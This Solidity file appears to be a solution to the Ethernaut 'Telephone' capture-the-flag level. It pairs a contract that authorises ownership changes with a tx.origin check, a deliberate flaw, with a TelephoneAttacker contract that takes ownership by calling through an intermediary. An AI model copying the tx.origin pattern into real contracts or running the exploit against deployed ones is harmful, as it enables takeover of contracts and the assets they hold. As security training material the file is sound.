// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Telephone {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract TelephoneAttacker {
    Telephone private telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwnership() public {
        telephone.changeOwner(msg.sender);
    }
}